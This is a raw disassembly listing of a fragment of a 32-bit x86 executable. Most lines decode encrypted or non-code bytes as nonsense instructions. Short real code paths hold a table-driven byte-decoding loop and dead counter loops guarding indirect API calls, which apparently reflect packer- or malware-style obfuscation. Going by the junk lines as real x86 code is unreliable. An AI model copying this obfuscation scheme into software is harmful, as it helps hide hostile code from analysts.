  4029b3:	lods   al,BYTE PTR ds:[esi]
  4029b4:	mov    esp,0xf4712f07
  4029b9:	add    edx,DWORD PTR [edx+ecx*2-0x52754c6f]
  4029c0:	push   esp
  4029c1:	pop    edx
  4029c2:	add    ecx,ebp
  4029c4:	(bad)  
  4029c5:	(bad)  
  4029c6:	imul   ebx,DWORD PTR [edi-0x6df3f295],0x40918665
  4029d0:	(bad)  
  4029d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4029d2:	push   esp
  4029d3:	mov    BYTE PTR [edi+0x46175d19],dl
  4029d9:	adc    eax,0xb4bfbab3
  4029de:	or     BYTE PTR [ecx-0x41],cl
  4029e1:	mov    ebx,0x4cd7a883
  4029e6:	ja     0x402999
  4029e8:	inc    esp
  4029e9:	add    al,0x4e
  4029eb:	rol    DWORD PTR [esp+edx*4+0xe],cl
  4029ef:	mov    ebx,0x12cc9945
  4029f4:	sar    BYTE PTR [eax-0x490776e2],0xdc
  4029fb:	cmp    edx,DWORD PTR gs:[edx]
  4029fe:	mov    cl,0x98
  402a00:	not    BYTE PTR [bp+0x4436]
  402a05:	xor    eax,0xc29a8f52
  402a0a:	add    eax,0x3941fe2
  402a0f:	jge    0x402a21
  402a11:	xor    edx,ecx
  402a13:	add    edx,esi
  402a15:	cmp    edx,edi
  402a17:	ja     0x402e5d
  402a1d:	push   ebx
  402a1e:	jmp    0x402a28
  402a23:	mov    esi,0x32729b
  402a28:	mov    eax,DWORD PTR [ebp-0x8]
  402a2b:	mov    edi,DWORD PTR [ebp-0x4]
  402a2e:	jmp    0x402c26
  402a33:	lock ss inc eax
  402a36:	xor    al,0x40
  402a38:	jo     0x402aaa
  402a3a:	repnz push ss
  402a3c:	pop    ds
  402a3d:	mov    ds:0xa5991e80,al
  402a42:	cli    
  402a43:	push   0x557e7e0c
  402a48:	jg     0x402ac8
  402a4a:	jle    0x4029e3
  402a4c:	or     BYTE PTR [ecx],al
  402a4e:	ret    0xe41c
  402a51:	ja     0x4029de
  402a53:	loop   0x402a18
  402a55:	xchg   esi,eax
  402a56:	jno    0x4029f3
  402a58:	xlat   BYTE PTR ds:[ebx]
  402a59:	aam    0x96
  402a5b:	mov    al,ds:0xb5cd7acb
  402a60:	xchg   BYTE PTR [edi+ebx*4],cl
  402a63:	into   
  402a64:	repz mov dh,BYTE PTR [ebp-0x6c]
  402a68:	push   ebp
  402a69:	and    eax,eax
  402a6b:	push   cs
  402a6c:	inc    edi
  402a6d:	add    BYTE PTR [edi-0x5c],cl
  402a70:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402a71:	and    al,0xdd
  402a73:	mov    esi,0x1290609d
  402a78:	pop    es
  402a79:	push   ecx
  402a7a:	rcl    dl,1
  402a7c:	dec    edx
  402a7d:	inc    esi
  402a7e:	pop    esp
  402a7f:	dec    esp
  402a80:	mov    eax,DWORD PTR [ecx+0x348b428e]
  402a86:	and    ah,dh
  402a88:	aaa    
  402a89:	dec    ebx
  402a8a:	fcom   QWORD PTR [edx+0x49]
  402a8d:	mov    edi,0x48a09ad4
  402a92:	push   ds
  402a93:	ins    BYTE PTR es:[edi],dx
  402a94:	push   edi
  402a95:	add    ch,0xe2
  402a98:	sahf   
  402a99:	push   esi
  402a9a:	jo     0x402b13
  402a9c:	mul    BYTE PTR [esi-0xe457542]
  402aa2:	cmp    al,0x62
  402aa4:	scas   eax,DWORD PTR es:[edi]
  402aa5:	into   
  402aa6:	aas    
  402aa7:	push   edx
  402aa8:	test   eax,0x7b16ea2f
  402aad:	sbb    al,0x61
  402aaf:	mov    eax,ds:0x323aac36
  402ab4:	out    0xb0,eax
  402ab6:	sub    eax,0x6384f843
  402abb:	pusha  
  402abc:	lods   eax,DWORD PTR ds:[esi]
  402abd:	repz mov cl,BYTE PTR [esi-0x27]
  402ac1:	ret    
  402ac2:	push   edx
  402ac3:	mov    esp,0x7fb11fbe
  402ac8:	mov    esp,0x84caad31
  402acd:	mov    ecx,0x88dad4da
  402ad2:	out    dx,al
  402ad3:	push   ss
  402ad4:	pop    esi
  402ad5:	(bad)  
  402ad6:	mov    esi,0x2ee60510
  402adb:	pusha  
  402adc:	pop    edi
  402add:	inc    esp
  402ade:	push   es
  402adf:	xchg   esi,eax
  402ae0:	mov    bh,0x1b
  402ae2:	mov    ds:0x7041ecbe,al
  402ae7:	iret   
  402ae8:	inc    edx
  402ae9:	repnz stc 
  402aeb:	mov    gs,WORD PTR [ebx]
  402aed:	out    0x30,eax
  402aef:	(bad)  
  402af0:	mov    bl,0xd8
  402af2:	ror    BYTE PTR [esi],1
  402af4:	test   eax,0xfae055b7
  402af9:	mov    dh,0x81
  402afb:	sbb    esp,DWORD PTR [ecx]
  402afd:	loopne 0x402afb
  402aff:	test   eax,0x7a64bd65
  402b04:	mov    ?,WORD PTR [ebp+edx*4-0x7599c996]
  402b0b:	sbb    bl,BYTE PTR [eax+0x39]
  402b0e:	push   ebx
  402b0f:	aaa    
  402b10:	xchg   dx,ax
  402b12:	and    BYTE PTR [ecx*1+0x3359eae1],dh
  402b19:	ins    BYTE PTR es:[edi],dx
  402b1a:	pop    es
  402b1b:	jae    0x402abb
  402b1d:	(bad)
  402b20:	xchg   DWORD PTR [edx-0x45313920],esi
  402b26:	test   al,0x60
  402b28:	popa   
  402b29:	arpl   WORD PTR [eax],ax
  402b2b:	mov    edi,0x446b596a
  402b30:	and    eax,0x47d67f07
  402b35:	cdq    
  402b36:	into   
  402b37:	outs   dx,BYTE PTR ds:[esi]
  402b38:	push   ebp
  402b39:	fdivr  QWORD PTR [ebx+edx*8]
  402b3c:	call   FWORD PTR [edx]
  402b3e:	xchg   edx,eax
  402b3f:	jbe    0x402b4a
  402b41:	lods   eax,DWORD PTR ds:[esi]
  402b42:	pop    edi
  402b43:	add    edi,DWORD PTR [ebp+0xd]
  402b46:	push   ss
  402b47:	les    esp,FWORD PTR [ecx-0x78]
  402b4a:	lea    ecx,[eax+edi*8+0x1b26d778]
  402b51:	pop    ebx
  402b52:	shr    DWORD PTR ds:0xca718b7f,cl
  402b58:	push   esp
  402b59:	mov    ah,0xc6
  402b5b:	cwde   
  402b5c:	inc    edi
  402b5d:	pop    edi
  402b5e:	test   al,0x70
  402b60:	aad    0x33
  402b62:	sbb    al,0xd3
  402b64:	push   edx
  402b65:	loopne 0x402b4c
  402b67:	cs pop ebx
  402b69:	add    DWORD PTR [edi+0x13],edx
  402b6c:	mov    ebp,0xdf08ef9f
  402b71:	mov    al,0xd
  402b73:	push   ecx
  402b74:	push   ebp
  402b75:	mov    ebx,0xe67a6bf0
  402b7a:	mov    bh,0xb4
  402b7c:	xchg   ebx,eax
  402b7d:	retf   
  402b7e:	aad    0x47
  402b80:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  402b82:	js     0x402b7f
  402b84:	loopne 0x402c01
  402b86:	mul    BYTE PTR [ecx-0x41]
  402b89:	push   es
  402b8a:	pop    ecx
  402b8b:	ins    DWORD PTR es:[edi],dx
  402b8c:	pop    edi
  402b8d:	xor    BYTE PTR [eax],dh
  402b8f:	mov    al,ds:0x13e5553f
  402b94:	mov    ebx,0xf46681e
  402b99:	test   eax,0xf4d084c9
  402b9e:	adc    al,0x4a
  402ba0:	aad    0xbd
  402ba2:	test   eax,0x2a9bdebc
  402ba7:	daa    
  402ba8:	mov    dh,0xdd
  402baa:	(bad)  
  402bac:	mov    ?,esi
  402bae:	xor    al,0x5e
  402bb0:	mov    edi,DWORD PTR [edi]
  402bb2:	cmp    eax,0x45e67c33
  402bb7:	mov    bh,bl
  402bb9:	test   al,0x7a
  402bbb:	imul   ebx,ecx,0xffffffde
  402bbe:	jno    0x402b94
  402bc0:	and    DWORD PTR [esi],edx
  402bc2:	push   esi
  402bc3:	pop    es
  402bc4:	mov    ebp,0xf99eb849
  402bc9:	addr16 jns 0x402b9a
  402bcc:	out    0xc4,al
  402bce:	cmp    dh,bh
  402bd0:	aaa    
  402bd1:	push   es
  402bd2:	lods   eax,DWORD PTR ds:[esi]
  402bd3:	mov    ebx,0xafcb5e60
  402bd8:	pop    edi
  402bd9:	jg     0x402b8e
  402bdb:	aad    0xf5
  402bdd:	aaa    
  402bde:	sahf   
  402bdf:	jbe    0x402c4e
  402be1:	ins    DWORD PTR es:[edi],dx
  402be2:	jns    0x402be9
  402be4:	push   edx
  402be5:	lods   al,BYTE PTR ds:[esi]
  402be6:	xchg   ebp,eax
  402be7:	jg     0x402c38
  402be9:	mov    ds:0x88c989f2,eax
  402bee:	pop    esi
  402bef:	adc    al,0xb6
  402bf1:	scas   al,BYTE PTR es:[edi]
  402bf2:	shl    bh,0x58
  402bf5:	and    al,0x8
  402bf7:	mov    edx,0xb7ba20ee
  402bfc:	xchg   esi,eax
  402bfd:	adc    DWORD PTR [eax-0x27b654f6],ebx
  402c03:	les    eax,FWORD PTR [edi-0x6767accc]
  402c09:	ins    BYTE PTR es:[edi],dx
  402c0a:	mov    DWORD PTR [ebx],ecx
  402c0c:	xchg   DWORD PTR [edx+edi*8],esi
  402c0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402c10:	lea    edi,[ebx]
  402c12:	data16 sub ah,ah
  402c15:	push   ss
  402c16:	stos   DWORD PTR es:[edi],eax
  402c17:	(bad)  
  402c18:	push   ds
  402c19:	cdq    
  402c1a:	xchg   ebx,eax
  402c1b:	sbb    eax,0x92f24d9a
  402c20:	cwde   
  402c21:	les    edi,FWORD PTR [ebx+0x3388f746]
  402c27:	stc    
  402c28:	add    edi,esi
  402c2a:	mov    esi,DWORD PTR [ebp+0x8]
  402c2d:	imul   edi,edx
  402c30:	mov    ebx,DWORD PTR [ebp+0xc]
  402c33:	xor    eax,ecx
  402c35:	add    eax,edx
  402c37:	mov    al,BYTE PTR [ebx+eax*1+0x32729b]
  402c3e:	mov    BYTE PTR [edi+esi*1],al
  402c41:	mov    eax,DWORD PTR [ebp-0x4]
  402c44:	xor    eax,ecx
  402c46:	lea    edx,[edx+eax*1+0x32729b]
  402c4d:	mov    eax,DWORD PTR [ebp-0x4]
  402c50:	xor    eax,ecx
  402c52:	mov    esi,0xffcd8d65
  402c57:	sub    esi,eax
  402c59:	jmp    0x402e51
  402c5e:	outs   dx,BYTE PTR ds:[esi]
  402c5f:	add    ebx,DWORD PTR [edi+0x6f72734e]
  402c65:	and    ebp,DWORD PTR [esi]
  402c67:	add    al,0x68
  402c69:	mov    dh,0x8c
  402c6b:	sbb    edx,ebx
  402c6d:	stos   BYTE PTR es:[edi],al
  402c6e:	dec    edi
  402c6f:	or     bh,BYTE PTR [esi+0x7e]
  402c72:	push   ebp
  402c73:	jg     0x402cf3
  402c75:	jle    0x402ca7
  402c77:	lds    eax,FWORD PTR [ecx-0x4d062ba0]
  402c7d:	adc    BYTE PTR [ecx-0x6d],dl
  402c80:	dec    edi
  402c81:	mov    bl,0xf4
  402c83:	mov    ebp,0x29fa8090
  402c88:	popf   
  402c89:	fidivr WORD PTR [edx]
  402c8b:	push   ss
  402c8c:	inc    edi
  402c8d:	lds    esi,FWORD PTR [ebx+0x6c1b3ac9]
  402c93:	push   eax
  402c94:	jl     0x402c85
  402c96:	and    edi,DWORD PTR [eax]
  402c98:	pusha  
  402c99:	inc    edi
  402c9a:	in     al,0x52
  402c9c:	arpl   WORD PTR [ecx+ebx*2],si
  402c9f:	imul   eax,DWORD PTR [edx-0x2f],0xffffffa8
  402ca3:	push   ds
  402ca4:	into   
  402ca5:	push   ss
  402ca6:	out    0xbf,al
  402ca8:	call   0x1cd4:0x8e380265
  402caf:	and    DWORD PTR [ebx],esp
  402cb1:	adc    eax,0x674d41e6
  402cb6:	test   BYTE PTR [eax],cl
  402cb8:	in     al,0xed
  402cba:	mov    bh,0xc6
  402cbc:	pop    es
  402cbd:	stc    
  402cbe:	adc    ecx,DWORD PTR [ecx+0x1d30961]
  402cc4:	xchg   edi,eax
  402cc5:	push   cs
  402cc6:	cmp    BYTE PTR [ebp+0x40],bh
  402cc9:	jnp    0x402cfc
  402ccb:	and    dl,BYTE PTR [ecx]
  402ccd:	adc    bh,BYTE PTR [esi-0x43ec6476]
  402cd3:	or     al,0x40
  402cd5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402cd6:	jle    0x402d24
  402cd8:	add    esp,DWORD PTR ds:0x8ba2051a
  402cde:	mov    ch,0xcb
  402ce0:	pop    DWORD PTR [edi-0x6f]
  402ce3:	mov    eax,ds:0xfd00fe40
  402ce8:	inc    edi
  402ce9:	pop    ss
  402cea:	or     DWORD PTR [edi-0x3c],eax
  402ced:	lds    esi,FWORD PTR [ebp+0x3e]
  402cf0:	add    BYTE PTR [ecx],0x72
  402cf3:	rcr    DWORD PTR [ebp+0x59],0x13
  402cf7:	push   edx
  402cf8:	push   ebp
  402cf9:	dec    edx
  402cfa:	xor    eax,0x45b4eafa
  402cff:	in     al,dx
  402d00:	cli    
  402d01:	dec    edx
  402d02:	cdq    
  402d03:	inc    esi
  402d04:	popf   
  402d05:	and    edi,DWORD PTR ds:[edx+0x1b688c54]
  402d0c:	mov    dl,0x7c
  402d0e:	mov    dl,0xeb
  402d10:	cld    
  402d11:	hlt    
  402d12:	dec    edx
  402d13:	push   ds
  402d14:	popa   
  402d15:	lods   eax,DWORD PTR ds:[esi]
  402d16:	pusha  
  402d17:	ins    BYTE PTR es:[edi],dx
  402d18:	sub    al,0x1e
  402d1a:	mov    es,WORD PTR [edx-0x5025caff]
  402d20:	icebp  
  402d21:	sti    
  402d22:	les    edi,FWORD PTR [edi-0x626f44c8]
  402d28:	(bad)  
  402d2a:	scas   al,BYTE PTR es:[edi]
  402d2b:	adc    edi,DWORD PTR [edi+ebp*4+0x517f4edb]
  402d32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402d33:	cmp    eax,0xb6abe921
  402d38:	je     0x402cd4
  402d3a:	mov    BYTE PTR [ebx],bl
  402d3c:	add    ch,BYTE PTR [ebp*4+0x9bb95cd]
  402d43:	sbb    ebx,ebp
  402d45:	cs and al,0xf3
  402d48:	and    edi,esp
  402d4a:	sub    al,0xe9
  402d4c:	test   ch,dh
  402d4e:	scas   eax,DWORD PTR es:[edi]
  402d4f:	mov    edx,0xae3fd5bc
  402d54:	outs   dx,DWORD PTR ds:[esi]
  402d55:	xor    BYTE PTR [edi],0xc5
  402d58:	sub    BYTE PTR [eax],ah
  402d5a:	pop    eax
  402d5b:	aam    0xa2
  402d5d:	add    cl,BYTE PTR [ecx+ecx*2-0x6f859318]
  402d64:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402d65:	fnsave ds:0x56471e2f
  402d6b:	js     0x402d7d
  402d6d:	sub    al,0x13
  402d6f:	adc    al,0xa9
  402d71:	stos   BYTE PTR es:[edi],al
  402d72:	push   0x57
  402d74:	dec    esp
  402d75:	inc    ecx
  402d76:	inc    edx
  402d77:	lea    esp,[edx-0x27f0449f]
  402d7d:	cmp    al,0x23
  402d7f:	mov    dh,0x51
  402d81:	mov    bl,0xf3
  402d83:	jno    0x402dcd
  402d85:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402d86:	fld    TBYTE PTR ss:[ebp+0x7e]
  402d8a:	mov    cl,0xc1
  402d8c:	out    0xc3,eax
  402d8e:	xor    eax,0xac29c38f
  402d93:	inc    edi
  402d94:	mov    DWORD PTR [esi],ebx
  402d96:	sbb    eax,0x3f52ed22
  402d9b:	xchg   edi,eax
  402d9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402d9d:	out    dx,al
  402d9e:	xchg   esi,esi
  402da0:	in     eax,0x94
  402da2:	push   ebp
  402da3:	bound  ebp,QWORD PTR [ecx]
  402da5:	loope  0x402dfd
  402da7:	call   0xc78d0acc
  402dac:	das    
  402dad:	xor    DWORD PTR [ebx*4+0x59d08264],ebx
  402db4:	mov    ds:0x2f34041f,al
  402db9:	lock push esi
  402dbb:	lock and BYTE PTR [edx+0x6b03480],dl
  402dc2:	sahf   
  402dc3:	and    DWORD PTR [edx+0x0],0x8445d071
  402dca:	xor    ah,dh
  402dcc:	test   eax,0x43a69051
  402dd1:	add    DWORD PTR [eax+edi*1+0x1b08bb64],edx
  402dd8:	rcr    BYTE PTR [ebx],cl
  402dda:	mov    ?,WORD PTR [ecx]
  402ddc:	popa   
  402ddd:	or     bh,BYTE PTR [esi-0x7a]
  402de0:	xor    ebp,eax
  402de2:	out    dx,al
  402de3:	in     al,0x54
  402de5:	fcmovu st,st(7)
  402de7:	dec    ecx
  402de8:	add    ecx,DWORD PTR [edi+ebx*8+0x74a794cf]
  402def:	lds    ecx,FWORD PTR [ecx+0x7682d2b8]
  402df5:	std    
  402df6:	sar    DWORD PTR [edx+0x11],1
  402df9:	xchg   edx,eax
  402dfa:	dec    esp
  402dfb:	pop    esp
  402dfc:	sbb    al,0x32
  402dfe:	test   DWORD PTR [ebx-0x6228ab3a],ecx
  402e04:	jmp    0x64be060f
  402e09:	sbb    eax,0xcb93fb32
  402e0e:	popf   
  402e0f:	aad    0x4d
  402e11:	jnp    0x402d9a
  402e13:	inc    eax
  402e14:	adc    ebx,0xe09efefd
  402e1a:	test   eax,0x3d73cf35
  402e1f:	jb     0x402e06
  402e21:	je     0x402dba
  402e23:	popf   
  402e24:	ins    DWORD PTR es:[edi],dx
  402e25:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402e26:	inc    eax
  402e27:	fs pop ebp
  402e29:	aaa    
  402e2a:	ret    
  402e2b:	ja     0x402dd9
  402e2d:	test   BYTE PTR [edi+0x7b603071],bh
  402e33:	imul   esp,DWORD PTR [edx+eiz*8],0xffffffeb
  402e37:	pop    edi
  402e38:	(bad)  
  402e39:	jne    0x402ea8
  402e3b:	and    esi,DWORD PTR [edx]
  402e3d:	fisub  DWORD PTR [ebx+eiz*2-0x57c36e37]
  402e44:	rol    DWORD PTR [ecx],0x25
  402e47:	push   esp
  402e48:	gs fadd QWORD PTR fs:[edi-0x62]
  402e4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402e4e:	pop    ecx
  402e4f:	add    dh,BYTE PTR [ebx+eax*1-0x29c4ef8b]
  402e56:	jbe    0x402a23
  402e5c:	pop    ebx
  402e5d:	mov    eax,0xf89c8532
  402e62:	pop    edi
  402e63:	pop    esi
  402e64:	leave  
  402e65:	ret    0xc
  402e68:	push   ebp
  402e69:	mov    ebp,esp
  402e6b:	sub    esp,0x58
  402e6e:	mov    ecx,DWORD PTR [ebp+0x8]
  402e71:	mov    eax,0x8a3c
  402e76:	xor    ax,WORD PTR [ecx+0x20]
  402e7a:	mov    ecx,0x3b02
  402e7f:	add    ax,cx
  402e82:	or     DWORD PTR ds:0x42e7d0,edi
  402e88:	movzx  eax,ax
  402e8b:	mov    ecx,DWORD PTR ds:0x430435
  402e91:	xor    ecx,DWORD PTR ds:0x42edd3
  402e97:	mov    DWORD PTR ds:0x430435,ecx
  402e9d:	mov    DWORD PTR [ebp-0xc],eax
  402ea0:	mov    BYTE PTR [ebp-0x1],0x7f
  402ea4:	sub    ecx,0x18d2
  402eaa:	lea    eax,[ebp-0x1]
  402ead:	and    DWORD PTR ds:0x42edef,0x0
  402eb7:	jmp    0x402ec9
  402ebc:	mov    ecx,DWORD PTR ds:0x42edef
  402ec2:	inc    ecx
  402ec3:	mov    DWORD PTR ds:0x42edef,ecx
  402ec9:	cmp    DWORD PTR ds:0x42edef,0x18
  402ed0:	jae    0x402fa2
  402ed6:	cmp    DWORD PTR ds:0x42edef,0x1a
  402edd:	jne    0x402eee
  402ee3:	push   0x2d42
  402ee8:	call   DWORD PTR ds:0x42ea9b
  402eee:	jmp    0x402ebc
  402ef3:	mov    DWORD PTR ds:0x42ede7,0x17
  402efd:	cmp    DWORD PTR ds:0x42ede7,0x0
  402f04:	je     0x402fa2
  402f0a:	cmp    DWORD PTR ds:0x42ede7,0x7
  402f11:	jne    0x402f2c
  402f17:	push   0x25f8
  402f1c:	push   0x430449
  402f21:	push   0x42e8b7
  402f26:	call   DWORD PTR ds:0x42e9b3
  402f2c:	cmp    DWORD PTR ds:0x42ede7,0x8
  402f33:	jne    0x402f48
  402f39:	xor    ecx,ecx
  402f3b:	or     ecx,DWORD PTR ds:0x42ede7
  402f41:	dec    ecx
  402f42:	mov    DWORD PTR ds:0x42ede7,ecx
  402f48:	mov    ecx,DWORD PTR ds:0x42ede7
  402f4e:	dec    ecx
  402f4f:	mov    DWORD PTR ds:0x42ede7,ecx
  402f55:	jmp    0x402efd
  402f5a:	and    DWORD PTR ds:0x42edcf,0x0
  402f64:	mov    ecx,DWORD PTR ds:0x42edcf
  402f6a:	inc    ecx
  402f6b:	mov    DWORD PTR ds:0x42edcf,ecx
  402f71:	cmp    DWORD PTR ds:0x42edcf,0x16
  402f78:	jne    0x402f8f
  402f7e:	push   DWORD PTR [ebp-0xc]
  402f81:	push   0x43046d
  402f86:	push   DWORD PTR [ebp-0x24]
  402f89:	call   DWORD PTR ds:0x42e9c7
  402f8f:	cmp    DWORD PTR ds:0x42edcf,0x10
  402f96:	jb     0x402f64
  402f9c:	add    DWORD PTR ds:0x42edcb,ebx
  402fa2:	mov    DWORD PTR [ebp-0x10],eax
  402fa5:	mov    DWORD PTR ds:0x430455,0x10
  402faf:	cmp    DWORD PTR ds:0x430455,0x0
  402fb6:	je     0x403010
  402fbc:	cmp    DWORD PTR ds:0x430455,0x4
  402fc3:	jne    0x402fda
  402fc9:	push   DWORD PTR [ebp-0x1c]
  402fcc:	push   DWORD PTR [ebp-0x20]
  402fcf:	push   0x42e82d
  402fd4:	call   DWORD PTR ds:0x42e9cb
  402fda:	cmp    DWORD PTR ds:0x430455,0x5
  402fe1:	jne    0x402ff4
  402fe7:	mov    ecx,DWORD PTR ds:0x430455
  402fed:	dec    ecx
  402fee:	mov    DWORD PTR ds:0x430455,ecx
  402ff4:	mov    ecx,DWORD PTR ds:0x430455
  402ffa:	dec    ecx
  402ffb:	mov    DWORD PTR ds:0x430455,ecx
  403001:	jmp    0x402faf
  403006:	and    DWORD PTR ds:0x43046d,0x3a0f
  403010:	mov    al,BYTE PTR [ebp-0x1]
  403013:	mov    ecx,DWORD PTR ds:0x42e7c0
  403019:	add    DWORD PTR ds:0x42edf3,ecx
  40301f:	mov    ecx,DWORD PTR [ebp-0x10]
  403022:	mov    DWORD PTR ds:0x4304db,0x1b71
  40302c:	xor    al,0x46
  40302e:	sub    al,0x38
  403030:	or     DWORD PTR ds:0x42e7c8,0x7677
  40303a:	mov    BYTE PTR [ecx],al
  40303c:	not    eax
  40303e:	jmp    0x40320b
  403043:	loop   0x40305e
  403045:	fcom   DWORD PTR [ebp+0x697355e1]
  40304b:	popf   
  40304c:	mov    DWORD PTR [ecx-0x48],ebp
  40304f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403050:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  403052:	sbb    al,0xa2
  403054:	or     BYTE PTR [esi+0x7e],bh
  403057:	scas   al,BYTE PTR es:[edi]
  403058:	jg     0x4030d8
  40305a:	jle    0x403054
  40305c:	dec    esi
  40305d:	sbb    DWORD PTR [esi+0x6e],eax
  403060:	xchg   edi,eax
  403061:	sahf   
  403062:	call   0x36ab:0xdbf66328
  403069:	shl    DWORD PTR [eax-0x4ec3a550],1
  40306f:	sar    BYTE PTR [edx+edx*1],1
  403072:	cmp    DWORD PTR [ebx+0x22],0x341cca66
  403079:	inc    ebp
  40307a:	sbb    bh,BYTE PTR [ebx+0x61101841]
  403080:	xchg   ebx,eax
  403081:	sar    BYTE PTR [ebx+edi*8],cl
  403084:	adc    BYTE PTR [ebx+0x56],0x60
  403088:	mov    dh,bl
  40308a:	mov    esp,DWORD PTR [ecx-0x741f8b91]
  403090:	mov    esp,0x7410774b
  403095:	repz or al,0xe3
  403098:	xor    DWORD PTR [ebx-0xa75896d],ebx
  40309e:	jmp    0x70837b5f
  4030a3:	daa    
  4030a4:	and    DWORD PTR [eax+ebp*8-0x7b],esi
  4030a8:	pusha  
  4030a9:	mul    BYTE PTR [ecx+0x19]
  4030ac:	mov    bl,0x12
  4030ae:	ja     0x403084
  4030b0:	mov    ds:0xda67dcb9,eax
  4030b5:	mov    al,ds:0x44c1fb6d
  4030ba:	inc    ecx
  4030bb:	add    al,0x9a
  4030bd:	push   es
  4030be:	xchg   edi,eax
  4030bf:	mov    esi,0xb73beea
  4030c4:	jmp    DWORD PTR [ecx-0x429b40aa]
  4030ca:	pop    ds
  4030cb:	xchg   BYTE PTR [edi-0x454f4b0d],al
  4030d1:	push   edx
  4030d2:	shl    BYTE PTR [ecx+0x2],cl
  4030d5:	pop    edi
  4030d6:	sti    
  4030d7:	mov    edx,0x3bbff529
  4030dc:	cmp    bh,BYTE PTR [ebx]
  4030de:	fwait
  4030df:	sub    al,0x8
  4030e1:	daa    
  4030e2:	bound  esp,QWORD PTR [ecx+0x13]
  4030e5:	loopne 0x403074
  4030e7:	dec    ecx
  4030e8:	jmp    0xe73bb32b
  4030ed:	xor    ah,ah
  4030ef:	add    eax,0x7e7fd51c
  4030f4:	shl    bh,0xa2
  4030f7:	cmp    BYTE PTR [eax+0x6b],al
  4030fa:	inc    esp
  4030fb:	iret   
  4030fc:	cmp    al,0xda
  4030fe:	ret    0x943c
  403101:	push   eax
  403102:	fimul  DWORD PTR [edi]
  403104:	(bad)  [ecx]
  403106:	push   ss
  403107:	stc    
  403108:	push   0x59a0d4c4
  40310d:	push   ebx
  40310e:	loopne 0x403174
  403110:	lods   eax,DWORD PTR ds:[esi]
  403111:	inc    ebx
  403112:	mov    esp,0x3557096
  403117:	inc    eax
  403118:	inc    ecx
  403119:	ror    BYTE PTR [ecx+0x5b],1
  40311c:	lahf   
  40311d:	adc    BYTE PTR ds:0x67950a6d,bl
  403123:	fist   DWORD PTR [esi]
  403125:	sub    al,0xea
  403127:	cmp    DWORD PTR [edi-0x71],0x26
  40312b:	mov    DWORD PTR [esp+edi*2-0x7b],ebp
  40312f:	mov    bl,0x29
  403131:	cmp    DWORD PTR [ecx+0x2e78c320],edx
  403137:	sub    DWORD PTR [ebx-0x6309aee0],edx
  40313d:	ret    0x8f42
  403140:	ficom  WORD PTR [edi+0x45]
  403143:	div    DWORD PTR [ebp-0x36]
  403146:	out    dx,eax
  403147:	dec    edx
  403148:	jno    0x4030e2
  40314a:	xor    DWORD PTR [ebx-0x34a48f0b],edi
  403150:	or     ch,BYTE PTR cs:[esi]
  403153:	push   0x78782430
  403158:	mov    dh,dh
  40315a:	mov    ah,0x9d
  40315c:	xor    BYTE PTR [ecx],bh
  40315e:	rol    BYTE PTR [eax+0x554c4791],1
  403164:	call   0x5620cf79
  403169:	push   ebp
  40316a:	out    0x1b,al
  40316c:	sbb    ebp,DWORD PTR [ebp-0x7d]
  40316f:	aad    0x51
  403171:	cmc    
  403172:	jae    0x4031b9
  403174:	out    0xc4,eax
  403176:	fnstenv [edi+0x45784b27]
  40317c:	xor    DWORD PTR [ecx-0x37a4821f],esp
  403182:	xchg   edx,eax
  403183:	retf   
  403184:	dec    eax
  403185:	dec    eax
  403186:	xchg   ebx,eax
  403187:	dec    ebp
  403188:	jp     0x4031da
  40318a:	fs out 0x77,eax
  40318d:	outs   dx,BYTE PTR ds:[esi]
  40318e:	inc    eax
  40318f:	push   0x7f
  403191:	and    eax,0x6c337d08
  403196:	mul    bh
  403198:	sub    BYTE PTR [edi-0x6607453e],ah
  40319e:	lods   al,BYTE PTR ds:[esi]
  40319f:	je     0x4031f7
  4031a1:	or     bh,BYTE PTR [eax+0x50aa058a]
  4031a7:	push   ecx
  4031a8:	dec    ebx
  4031a9:	ficom  DWORD PTR [edx]
  4031ab:	xchg   ebp,eax
  4031ac:	fimul  DWORD PTR [ebx]
  4031ae:	out    dx,eax
  4031af:	xchg   esp,eax
  4031b0:	jl     0x4031af
  4031b2:	add    eax,0xc9b9cc42
  4031b7:	or     BYTE PTR [ecx+eax*1-0x6a284a88],al
  4031be:	data16 (bad) 
  4031c0:	adc    esi,DWORD PTR [esi]
  4031c2:	mov    ebp,0x3822b913
  4031c7:	cmp    BYTE PTR [ebp+eax*4+0x350f03cb],al
  4031ce:	mov    bh,cl
  4031d0:	add    al,BYTE PTR [ecx]
  4031d2:	pop    edx
  4031d3:	jecxz  0x403191
  4031d5:	or     bh,BYTE PTR [edi-0x54]
  4031d8:	xchg   edi,eax
  4031d9:	mov    WORD PTR [esi+0x318ae7dd],es
  4031df:	sub    al,0x2b
  4031e1:	into   
  4031e2:	cs cmc 
  4031e4:	lock mov al,ds:0x62fa1c60
  4031ea:	repnz popf 
  4031ec:	cmp    eax,0xbd6e2d45
  4031f1:	xor    eax,0xab5a3480
  4031f6:	iret   
  4031f7:	in     eax,dx
  4031f8:	mov    eax,0xe4b4ae9d
  4031fd:	cmp    DWORD PTR [eax-0x1528c386],0x2b
  403204:	mov    bh,0x60
  403206:	leave  
  403207:	jle    0x403283
  403209:	sbb    bl,ch
  40320b:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  403212:	mov    DWORD PTR [ebp-0x10],0xf89c8532
  403219:	or     DWORD PTR ds:0x42edef,ecx
  40321f:	mov    eax,DWORD PTR [ebp-0x8]
  403222:	movzx  ecx,WORD PTR ds:0x42edcb
  403229:	adc    DWORD PTR ds:0x4304d7,ecx
  40322f:	mov    ecx,0x7510854
  403234:	sub    DWORD PTR ds:0x42e7c8,0x77ef
  40323e:	push   esi
  40323f:	xor    eax,ecx
  403241:	and    DWORD PTR ds:0x430461,0x33b1
  40324b:	jmp    0x403418
  403250:	inc    ecx
  403251:	jp     0x4031f4
  403253:	cs popa 
  403255:	mov    ch,0x51
  403257:	jno    0x403251
